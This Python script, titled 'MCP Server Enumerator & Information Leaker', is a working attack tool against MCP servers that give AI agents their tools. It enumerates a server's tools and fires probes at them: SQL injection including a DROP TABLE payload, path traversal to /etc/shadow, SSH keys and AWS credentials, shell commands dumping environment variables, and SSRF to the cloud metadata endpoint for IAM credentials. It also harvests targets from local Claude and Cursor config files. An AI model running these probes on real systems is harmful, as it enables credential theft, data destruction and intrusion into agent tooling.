"""
MCP Server Enumerator & Information Leaker

Discovers MCP servers and attempts to extract sensitive information from them:
- Enumerate all available tools and their schemas
- Probe tool arguments for information disclosure
- Attempt to read secrets, credentials, configs
- Test for path traversal in file-access tools
- Test for SSRF in URL-accepting tools
- Test for command injection in shell-like tools

Usage:
    python mcp_enum.py --url https://target-mcp-server.com
    python mcp_enum.py --url https://target-mcp-server.com --deep
    python mcp_enum.py --discover  # scan local MCP configs
"""
from __future__ import annotations

import argparse
import json
import time
import sys
import os
import base64
from pathlib import Path
from dataclasses import dataclass, field

import httpx


@dataclass
class Finding:
    severity: str  # critical, high, medium, low, info
    category: str
    title: str
    details: str
    response: str = ""


def jsonrpc(method: str, params: dict = None, req_id: int = 1) -> dict:
    msg = {"jsonrpc": "2.0", "method": method, "id": req_id}
    if params:
        msg["params"] = params
    return msg


def send(url: str, payload: dict, headers: dict = None) -> tuple[int, dict | str]:
    hdrs = {"Content-Type": "application/json", "User-Agent": "mcp-client/1.0"}
    if headers:
        hdrs.update(headers)
    try:
        with httpx.Client(timeout=15, verify=False) as client:
            r = client.post(url, json=payload, headers=hdrs)
            try:
                return r.status_code, r.json()
            except json.JSONDecodeError:
                return r.status_code, r.text
    except Exception as e:
        return 0, str(e)


# ============================================================
# DISCOVERY: Find MCP servers from local config files
# ============================================================

def discover_local_configs() -> list[dict]:
    """Scan common MCP config locations."""
    configs = []
    search_paths = [
        Path.home() / ".claude.json",
        Path.home() / ".claude" / "settings.json",
        Path.home() / ".cursor" / "mcp.json",
        Path.home() / ".config" / "kiro" / "mcp.json",
        Path.cwd() / ".mcp.json",
        Path.cwd() / "mcp.json",
        Path.cwd() / ".cursor" / "mcp.json",
    ]

    # Also search for any .mcp.json in parent directories
    cwd = Path.cwd()
    for _ in range(5):
        candidate = cwd / ".mcp.json"
        if candidate.exists() and candidate not in search_paths:
            search_paths.append(candidate)
        cwd = cwd.parent

    for path in search_paths:
        if path.exists():
            try:
                data = json.loads(path.read_text(encoding="utf-8"))
                servers = data.get("mcpServers", {})
                for name, config in servers.items():
                    if isinstance(config, dict):
                        url = config.get("url", "")
                        server_type = config.get("type", "unknown")
                        configs.append({
                            "name": name,
                            "url": url,
                            "type": server_type,
                            "source": str(path),
                            "config": config,
                        })
            except (json.JSONDecodeError, KeyError):
                pass

    return configs


# ============================================================
# ENUMERATION: Discover tools, resources, prompts
# ============================================================

def enumerate_server(url: str) -> dict:
    """Full enumeration of an MCP server's capabilities."""
    info = {"url": url, "server_info": None, "tools": [], "resources": [], "prompts": [], "errors": []}

    # Initialize
    code, resp = send(url, jsonrpc("initialize", {
        "protocolVersion": "2025-06-18",
        "capabilities": {"tools": {}, "resources": {}, "prompts": {}},
        "clientInfo": {"name": "security-scanner", "version": "1.0.0"}
    }))

    if code != 200:
        info["errors"].append(f"Initialize failed: {code}")
        return info

    if isinstance(resp, dict):
        info["server_info"] = resp.get("result", {}).get("serverInfo", {})

    # Send initialized notification
    send(url, {"jsonrpc": "2.0", "method": "notifications/initialized"})

    # List tools
    code, resp = send(url, jsonrpc("tools/list"))
    if isinstance(resp, dict):
        info["tools"] = resp.get("result", {}).get("tools", [])

    # List resources
    code, resp = send(url, jsonrpc("resources/list"))
    if isinstance(resp, dict) and "result" in resp:
        info["resources"] = resp.get("result", {}).get("resources", [])

    # List prompts
    code, resp = send(url, jsonrpc("prompts/list"))
    if isinstance(resp, dict) and "result" in resp:
        info["prompts"] = resp.get("result", {}).get("prompts", [])

    return info


# ============================================================
# INFORMATION LEAKAGE: Attempt to extract sensitive data
# ============================================================

def leak_secrets(url: str, tools: list) -> list[Finding]:
    """Attempt to extract sensitive information through tool calls."""
    findings = []

    for tool in tools:
        name = tool.get("name", "")
        schema = tool.get("inputSchema", {})
        properties = schema.get("properties", {})

        # Determine what kind of tool this is and craft appropriate probes
        probes = generate_probes(name, properties)

        for probe_name, args in probes:
            code, resp = send(url, jsonrpc("tools/call", {"name": name, "arguments": args}))

            if code == 200 and isinstance(resp, dict):
                result = resp.get("result", {})
                content = result.get("content", [])
                is_error = result.get("isError", False)

                for item in content:
                    text = item.get("text", "")
                    if text and not is_error:
                        finding = analyze_response(name, probe_name, args, text)
                        if finding:
                            findings.append(finding)

            time.sleep(0.5)

    return findings


def generate_probes(tool_name: str, properties: dict) -> list[tuple[str, dict]]:
    """Generate targeted probes based on tool name and schema."""
    probes = []
    name_lower = tool_name.lower()

    # Secret/vault/credential tools
    if any(k in name_lower for k in ["secret", "vault", "credential", "key", "token", "password", "config"]):
        key_field = next((k for k in properties if k in ("key", "name", "id", "path", "secret_name")), list(properties.keys())[0] if properties else "key")
        secret_keys = [
            "aws", "AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY",
            "database", "db_password", "DB_CONNECTION_STRING",
            "api_key", "OPENAI_API_KEY", "ANTHROPIC_API_KEY",
            "admin", "root", "production",
            "private_key", "ssh_key", "tls_cert",
            "jwt_secret", "session_secret", "encryption_key",
            "../../../etc/passwd", "../../../../etc/shadow",
        ]
        for key in secret_keys:
            probes.append((f"secret_read/{key}", {key_field: key}))

    # Database/query tools
    if any(k in name_lower for k in ["db", "query", "sql", "database", "postgres", "mysql", "mongo"]):
        sql_field = next((k for k in properties if k in ("sql", "query", "statement", "command")), list(properties.keys())[0] if properties else "sql")
        queries = [
            "SELECT * FROM users LIMIT 10",
            "SELECT table_name FROM information_schema.tables",
            "SELECT * FROM pg_shadow",
            "SHOW DATABASES",
            "SELECT * FROM credentials",
            "SELECT * FROM secrets",
            "SELECT * FROM api_keys",
            "; DROP TABLE users; --",
        ]
        for q in queries:
            probes.append((f"db_query/{q[:30]}", {sql_field: q}))

    # File/filesystem tools
    if any(k in name_lower for k in ["file", "read", "fs", "filesystem", "path", "document"]):
        path_field = next((k for k in properties if k in ("path", "file", "filename", "filepath")), list(properties.keys())[0] if properties else "path")
        paths = [
            "/etc/passwd", "/etc/shadow", "/etc/hosts",
            "~/.ssh/id_rsa", "~/.ssh/authorized_keys",
            "~/.aws/credentials", "~/.aws/config",
            ".env", "../.env", "../../.env",
            "/proc/self/environ",
            "C:\\Users\\Administrator\\.ssh\\id_rsa",
            "../../../etc/passwd",
        ]
        for p in paths:
            probes.append((f"file_read/{p}", {path_field: p}))

    # Shell/command/exec tools
    if any(k in name_lower for k in ["shell", "exec", "command", "run", "terminal", "bash", "cmd"]):
        cmd_field = next((k for k in properties if k in ("command", "cmd", "script", "code")), list(properties.keys())[0] if properties else "command")
        commands = [
            "id", "whoami", "hostname",
            "env", "printenv",
            "cat /etc/passwd",
            "cat ~/.ssh/id_rsa",
            "cat .env",
            "ls -la /",
            "curl http://169.254.169.254/latest/meta-data/",
            "aws sts get-caller-identity",
        ]
        for c in commands:
            probes.append((f"cmd_exec/{c[:20]}", {cmd_field: c}))

    # HTTP/URL/fetch tools
    if any(k in name_lower for k in ["http", "fetch", "url", "request", "web", "curl", "api"]):
        url_field = next((k for k in properties if k in ("url", "endpoint", "uri", "target")), list(properties.keys())[0] if properties else "url")
        urls = [
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://localhost:8080/admin",
            "http://127.0.0.1:3000/api/config",
            "http://internal.service.local/secrets",
            "file:///etc/passwd",
        ]
        for u in urls:
            probes.append((f"ssrf/{u[:30]}", {url_field: u}))

    # Generic: if we don't recognize the tool, try common field names
    if not probes and properties:
        first_field = list(properties.keys())[0]
        probes.append(("generic/test", {first_field: "test"}))
        probes.append(("generic/admin", {first_field: "admin"}))
        probes.append(("generic/config", {first_field: "../../../.env"}))

    return probes


def analyze_response(tool_name: str, probe_name: str, args: dict, text: str) -> Finding | None:
    """Analyze a tool response for sensitive information."""
    text_lower = text.lower()

    # Check for credential patterns
    if any(k in text for k in ["AKIA", "sk-", "ghp_", "glpat-", "xoxb-", "xoxp-"]):
        return Finding("critical", "credential_leak", f"API key/token found in {tool_name} response",
                      f"Probe: {probe_name}, Args: {args}", text[:500])

    if any(k in text_lower for k in ["password", "secret_access_key", "private_key", "-----begin"]):
        return Finding("critical", "credential_leak", f"Credential material in {tool_name} response",
                      f"Probe: {probe_name}, Args: {args}", text[:500])

    # Check for system info
    if any(k in text_lower for k in ["root:x:0:0", "/bin/bash", "/bin/sh"]):
        return Finding("high", "system_info", f"System file contents from {tool_name}",
                      f"Probe: {probe_name}", text[:500])

    # Check for database content
    if any(k in text_lower for k in ["table_name", "information_schema", "pg_shadow"]):
        return Finding("high", "data_leak", f"Database schema exposed via {tool_name}",
                      f"Probe: {probe_name}", text[:500])

    # Check for cloud metadata
    if any(k in text_lower for k in ["ami-id", "instance-id", "security-credentials", "iam"]):
        return Finding("critical", "ssrf", f"Cloud metadata accessible via {tool_name}",
                      f"Probe: {probe_name}", text[:500])

    # Check for environment variables
    if any(k in text for k in ["AWS_", "OPENAI_", "DATABASE_URL", "SECRET_KEY", "API_KEY"]):
        return Finding("high", "env_leak", f"Environment variables exposed via {tool_name}",
                      f"Probe: {probe_name}", text[:500])

    # Check for connection strings
    if any(k in text_lower for k in ["postgres://", "mysql://", "mongodb://", "redis://"]):
        return Finding("high", "connection_string", f"Database connection string from {tool_name}",
                      f"Probe: {probe_name}", text[:500])

    # Check for non-error, non-trivial responses (potential info disclosure)
    if len(text) > 50 and "denied" not in text_lower and "error" not in text_lower and "not found" not in text_lower:
        return Finding("low", "info_disclosure", f"Non-trivial response from {tool_name}",
                      f"Probe: {probe_name}", text[:300])

    return None


# ============================================================
# MAIN
# ============================================================

def main():
    parser = argparse.ArgumentParser(description="MCP Server Enumerator & Information Leaker")
    parser.add_argument("--url", help="Target MCP server URL")
    parser.add_argument("--discover", action="store_true", help="Discover MCP servers from local configs")
    parser.add_argument("--deep", action="store_true", help="Run deep probing (more aggressive)")
    args = parser.parse_args()

    print("=" * 70)
    print("  MCP SERVER ENUMERATOR & INFORMATION LEAKER")
    print("=" * 70)

    targets = []

    if args.discover:
        print("\n  [DISCOVERY] Scanning local MCP configs...")
        configs = discover_local_configs()
        if configs:
            for c in configs:
                print(f"    Found: {c['name']} → {c['url'] or c['type']} (from {c['source']})")
                if c["url"]:
                    targets.append(c["url"])
        else:
            print("    No MCP configs found.")

    if args.url:
        targets.append(args.url)

    if not targets:
        print("\n  No targets. Use --url or --discover.")
        return

    all_findings = []

    for url in targets:
        print(f"\n\n  [TARGET] {url}")
        print("  " + "=" * 60)

        # Enumerate
        print("\n  [ENUM] Enumerating server capabilities...")
        info = enumerate_server(url)

        if info["server_info"]:
            print(f"    Server: {info['server_info'].get('name', '?')} v{info['server_info'].get('version', '?')}")

        print(f"    Tools: {len(info['tools'])}")
        for t in info["tools"]:
            desc = t.get("description", "")[:60]
            print(f"      - {t['name']}: {desc}")

        if info["resources"]:
            print(f"    Resources: {len(info['resources'])}")
            for r in info["resources"]:
                print(f"      - {r.get('name', r.get('uri', '?'))}")

        if info["prompts"]:
            print(f"    Prompts: {len(info['prompts'])}")
            for p in info["prompts"]:
                print(f"      - {p.get('name', '?')}")

        # Leak
        if info["tools"]:
            print(f"\n  [LEAK] Probing {len(info['tools'])} tools for information disclosure...")
            findings = leak_secrets(url, info["tools"])
            all_findings.extend(findings)

            for f in findings:
                icon = {"critical": "🔴", "high": "🟠", "medium": "🟡", "low": "🔵", "info": "ℹ️"}.get(f.severity, "?")
                print(f"\n    {icon} [{f.severity.upper()}] {f.title}")
                print(f"       {f.details}")
                if f.response:
                    print(f"       Response: {f.response[:150]}")

    # Summary
    print(f"\n\n{'=' * 70}")
    print(f"  SUMMARY")
    print(f"{'=' * 70}")
    print(f"  Targets scanned: {len(targets)}")
    print(f"  Total findings: {len(all_findings)}")
    crits = sum(1 for f in all_findings if f.severity == "critical")
    highs = sum(1 for f in all_findings if f.severity == "high")
    meds = sum(1 for f in all_findings if f.severity == "medium")
    if crits:
        print(f"  🔴 Critical: {crits}")
    if highs:
        print(f"  🟠 High: {highs}")
    if meds:
        print(f"  🟡 Medium: {meds}")
    if not all_findings:
        print(f"  No sensitive data leaked.")
    print(f"{'=' * 70}")


if __name__ == "__main__":
    main()
